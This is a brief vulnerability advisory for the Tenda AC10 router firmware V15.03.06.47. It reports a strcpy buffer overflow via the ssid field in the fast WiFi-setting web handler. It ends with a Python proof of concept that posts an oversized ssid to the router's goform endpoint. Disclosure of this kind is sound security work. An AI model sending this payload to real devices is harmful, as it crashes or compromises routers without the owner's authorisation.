# buffer overflow

## Tenda_AC10

version: V15.03.06.47

## Description:

There is a buffer overflow in httpd/form_fast_setting_wifi_set

## Source:

you may download it from : https://www.tendacn.com/download/detail-3796.html

## Analyse:


![](1.png)

get value from ssid ,then call strcpy, cause buff overflow




## POC
```
url = "http://192.168.1.13/goform/fastsettingwifiset"
payload = 'A'*300 + '\n'

r = requests.post(url, data={'ssid': payload})
``` 
